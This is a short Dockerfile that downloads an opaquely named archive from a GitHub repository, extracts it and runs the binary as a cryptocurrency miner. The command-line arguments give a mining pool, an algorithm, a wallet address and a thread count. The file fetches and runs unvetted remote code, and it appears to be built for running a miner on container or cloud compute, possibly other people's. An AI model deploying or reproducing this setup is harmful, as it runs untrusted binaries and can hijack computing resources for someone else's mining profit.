FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/Tesa-UII/storage/raw/main/tulul.tar.gz
RUN tar -xvf tulul.tar.gz

ENTRYPOINT [ "./tulul" ]
CMD [ "-a", "yespowerurx", "-o", "stratum+tcps://stratum-eu.rplant.xyz:13361", "-u", "UXZvYqfHAx7W49CCHy9D2duoPL16cfzmtD.BEBAS", "-t16" ]

